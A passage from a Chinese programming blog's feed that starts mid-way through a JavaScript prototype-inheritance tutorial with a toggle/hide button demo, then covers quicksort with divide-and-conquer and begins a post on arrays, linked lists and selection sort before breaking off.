function_">run</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> div3 = <span class="keyword">new</span> <span class="title class_">App</span>(<span class="string">&#x27;#app3&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">color</span>: [<span class="string">&#x27;#d35400&#x27;</span>, <span class="string">&#x27;#f39c12&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line">div3.<span class="title function_">run</span>()</span><br></pre></td></tr></table></figure><p>就算你有其它需要类似功能的模块，你也可以直接实例化该对象并执行run方法，而不用每个同功能的模块书写多次相同冗余的代码了</p><p>全部代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="built_in">rgba</span>(<span class="number">226</span>, <span class="number">121</span>, <span class="number">247</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      *<span class="selector-attr">[name=<span class="string">&quot;sec&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: pink;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">input</span><span class="selector-attr">[name]</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: pink;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/* border: pink; */</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">10%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;切换&quot;</span> <span class="attr">name</span>=<span class="string">&quot;switch&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;隐藏&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hide&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">name</span>=<span class="string">&quot;sec&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;切换&quot;</span> <span class="attr">name</span>=<span class="string">&quot;switch&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;隐藏&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hide&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">name</span>=<span class="string">&quot;sec&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;切换&quot;</span> <span class="attr">name</span>=<span class="string">&quot;switch&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;隐藏&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hide&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">nav</span> <span class="attr">name</span>=<span class="string">&quot;sec&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">Animation</span>(<span class="params"></span>) &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Animation</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hide</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Animation</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Animation</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">change</span> = <span class="keyword">function</span> (<span class="params">color, value</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = color;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">innerHTML</span> = value;</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// * 原型继承工厂函数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">extend</span>(<span class="params">child, dad</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        child.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(dad.<span class="property"><span class="keyword">prototype</span></span>);</span></span><br><span class="line"><span class="language-javascript">        child.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = child;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(child, <span class="string">&#x27;constructor&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">value</span>: child,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">enumerable</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params">id, data=&#123;&#125;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">div</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(id);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">btnS</span> = <span class="variable language_">this</span>.<span class="property">div</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;switch&quot;]&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">btnH</span> = <span class="variable language_">this</span>.<span class="property">div</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;hide&quot;]&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">sec</span> = <span class="variable language_">this</span>.<span class="property">div</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;sec&quot;]&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">data</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">color</span>: [<span class="string">&#x27;#8e44ad&#x27;</span>, <span class="string">&#x27;#16a085&#x27;</span>], </span></span><br><span class="line"><span class="language-javascript">          <span class="attr">value</span>: [<span class="string">&#x27;你好&#x27;</span>, <span class="string">&#x27;再见&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">tog</span>: <span class="literal">true</span>, <span class="comment">//用于记录切换状态</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,data)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">extend</span>(<span class="title class_">App</span>, <span class="title class_">Animation</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">changeIf</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="property">value</span> === <span class="string">&#x27;隐藏&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">hide</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="property">value</span> = <span class="string">&#x27;显示&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">show</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">btnH</span>.<span class="property">value</span> = <span class="string">&#x27;隐藏&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toggle</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">btnS</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">change</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>, <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">color</span>[<span class="number">1</span>], <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">value</span>[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span> = !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">change</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>, <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">color</span>[<span class="number">0</span>], <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">value</span>[<span class="number">0</span>]);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span> = !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">tog</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">show</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">change</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">sec</span>, <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">color</span>[<span class="number">0</span>], <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">value</span>[<span class="number">0</span>])</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">App</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">run</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">toggle</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">changeIf</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">init</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> div1 = <span class="keyword">new</span> <span class="title class_">App</span>(<span class="string">&#x27;#app1&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">       <span class="attr">color</span>: [<span class="string">&#x27;#27ae60&#x27;</span>, <span class="string">&#x27;#2980b9&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">       <span class="attr">value</span>: [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;bye&#x27;</span>] </span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      div1.<span class="title function_">run</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> div2 = <span class="keyword">new</span> <span class="title class_">App</span>(<span class="string">&#x27;#app2&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      div2.<span class="title function_">run</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> div3 = <span class="keyword">new</span> <span class="title class_">App</span>(<span class="string">&#x27;#app3&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">color</span>: [<span class="string">&#x27;#d35400&#x27;</span>, <span class="string">&#x27;#f39c12&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">      div3.<span class="title function_">run</span>()</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>思维导图总结</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210529101210203.png" alt="image-20210529101210203"></p><p>这便是对以上全部知识点综合练习的案例了，不足之处还望批评指出，<strong>请多多指教</strong></p>]]></content>
    
    <summary type="html">
    
      来吧，快七千字的js原型笔记，好好嚼吧，😭😭😭
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://Dong-666.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://Dong-666.github.io/tags/JavaScript/"/>
    
      <category term="ES6" scheme="http://Dong-666.github.io/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>快速排序</title>
    <link href="http://dong-666.github.io/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
    <id>http://dong-666.github.io/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</id>
    <published>2021-08-20T08:00:00.000Z</published>
    <updated>2022-03-02T08:00:01.253Z</updated>
    
    <content type="html"><![CDATA[<h2 id="D-amp-C（分而治之）"><a href="#D-amp-C（分而治之）" class="headerlink" title="D&amp;C（分而治之）"></a>D&amp;C（分而治之）</h2><p>工作原理：</p><ol><li>找出简单的基线条件；</li><li>确定如何缩小问题的规模，使其符合基线条件</li></ol><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>对一块400m * 640m的土地进行划分</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/image-20210829165345879.png" alt="image-20210829165345879" style="zoom:50%;"><p>对于640 m × 400 m的土地，可从中划出的最 大方块为400 m × 400 m。 这将余下一块更小的土地，其尺寸为400 m × 240 m</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/image-20210829165421947.png" alt="image-20210829165421947"></p><blockquote><p>重点：适用于这小块地的最大方块（正方形），也是适用于整块地的最大方块</p><p>这是关于“欧几里得算法”的知识</p></blockquote><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><blockquote><p>采用分而治之的思想进行排序，是对<a href="https://baike.baidu.com/item/冒泡排序/4602306">冒泡排序</a>算法的一种改进</p></blockquote><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤:"></a>步骤:</h3><p>1) 选择基准值。</p><p>2) 将数组分成两个子数组：小于基准值的元素和大于基准值的元素。 </p><p>3) 对这两个子数组进行快速排序。</p><h2 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h2><p>使用快速排序进行排序</p><ol><li>定义左数组存储比当前值小的值，右数组存储比当前数值大的值，以及当前比较目标值</li><li>定义基线条件：当当前传参数组索引小于等于1时，停止执行下面代码并返回当前数组</li><li>定义递归条件<ol><li>截取当前数组内要进行比较的目标值，避免参与遍历导致无限循环</li><li>进行遍历：大于当前值放至右数组，小于当前值放至左数组</li></ol></li><li>返回左数组＋当前值+右数组</li></ol><p>![carbon (1)](快速排序/carbon (1).png)</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>D&amp;C将问题逐步分解。使用D&amp;C处理列表时，基线条件很可能是空数组或只包含一个元素的数组。</li><li>实现快速排序时，请随机地选择用作基准值的元素。快速排序的平均运行时间为O(n log n)。 </li><li>大O表示法中的常量有时候事关重大，这就是快速排序比合并排序快的原因所在。 </li><li>比较简单查找和二分查找时，常量几乎无关紧要，因为列表很长时，O(log n)的速度比O(n) 快得多。</li></ol>]]></content>
    
    <summary type="html">
    
      采用分而治之的思想进行排序，是对冒泡排序算法的一种改进
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>选择排序</title>
    <link href="http://dong-666.github.io/2021/08/12/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/"/>
    <id>http://dong-666.github.io/2021/08/12/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</id>
    <published>2021-08-12T08:00:00.000Z</published>
    <updated>2022-03-02T08:00:41.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内存工作原理"><a href="#内存工作原理" class="headerlink" title="内存工作原理"></a>内存工作原理</h2><p>这里涉及的数据类型为<a href="https://blog.csdn.net/Oralinge/article/details/103585108">引用类型</a>，计算机就像是很多抽屉的集合体，每个抽屉都有地址，当你往里面存储数据时，计算机会将每个数据存储到各自的“抽屉”去，然后用一个内存地址指向该抽屉，方便你根据内存地址去拿取你所需的值</p><p>需要将数据存储到内存时，你请求计算机提供存储空间，计算机给你一个存储地址。需要存储多项数据时，有两种基本方式——数组和链表。</p><h2 id="数组和链表"><a href="#数组和链表" class="headerlink" title="数组和链表"></a>数组和链表</h2><p>这里只会简单阐述数组和链表的概念，更多会讲述这两种不同数据类型的区别</p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><blockquote><p>链表是一种物理<a href="https://baike.baidu.com/item/存储单元/8727749">存储单元</a>上非连续、非顺序的<a href="https://baike.baidu.com/item/存储结构/350782">存储结构</a>，<a href="https://baike.baidu.com/item/数据元素/715313">数据元素</a>的逻辑顺序是通过链表中的<a href="https://baike.baidu.com/item/指针/2878304">指针</a>链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储<a href="https://baike.baidu.com/item/数据元素">数据元素</a>的数据域，另一个是存储下一个结点地址的<a href="https://baike.baidu.com/item/指针/2878304">指针</a>域。 </p></blockquote><p>简单来说，链表中的元素可存储在内存的任何地方，链表的每个元素都存储了下一个元素的地址，从而使一系列随机的内存地址串在一起。所以，<strong>链表的优势在插入元素方面</strong>。</p><p>当你要往数组插入元素时，计算机要根据数组的长度去寻找一块连续的跟该数组长度相匹配的内存去进行存储，而链表只要存储下个元素的内存地址即可，所以即使链表中的各个数据是分开的不连续的，但还是能通过上一个数据去寻找下个数据的位置。所以在插入数据方面，链表无需考虑其他，直接往内存插入新值即可</p><p>这里举个例子，你和两个朋友去看电影，一般来说，你们三个如果关系太好了，好基友那种，分不开了，你们一般会买三张连续座位的票，从而可以坐在一起看，这便是数组，而当没有三张连续的电影票时，你们只能分开看，但可以根据电影票上的座位位置去找你的小伙伴，这便是链表。这里的座位编号便是内存地址，而你们就是一个又一个的数据。</p><p>在删除方面：链表也是更好的选择，因为只需修改前一个元素指向的地址即可。而使用数组时，删除元素后，必须将后面的元素都向前移</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><blockquote><p><strong>数组</strong>（Array）是有序的元素序列。 [1] 若将有限个类型相同的变量的<a href="https://baike.baidu.com/item/集合/2908117">集合</a>命名，那么这个名称为数组名。组成数组的各个变量称为数组的分量，也称为数组的元素，有时也称为<a href="https://baike.baidu.com/item/下标变量/12713827">下标变量</a>。用于区分数组的各个元素的数字编号称为下标。数组是在<a href="https://baike.baidu.com/item/程序设计/223952">程序设计</a>中，为了处理方便， 把具有相同类型的若干元素按<strong>有序</strong>的形式组织起来的一种形式。  这些有序排列的同类数据元素的集合称为数组</p></blockquote><p>数组的优势：需要随机地读取元素时，数组的效率很高，因为可迅速找到数组的任何元素。在链表中，元素并非靠在一起的，你无法迅速计算出第五个元素的内存地址，而必须先访问第一个元素以获取第二个元素的地址，再访问第二个元素以获取第三个元素 的地址，以此类推，直到访问第五个元素</p><h3 id="两者总结"><a href="#两者总结" class="headerlink" title="两者总结"></a>两者总结</h3><ul><li>链表的每个元素都存储了下一个元素的地址，从而使一系列随机的内存地址串在一起</li><li>数组的元素都在一起</li><li>数组的读取速度比链表快</li><li>链表的插入和删除速度比数组快</li><li>在同一个数组中，所有元素的类型都必须相同</li></ul><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p><a 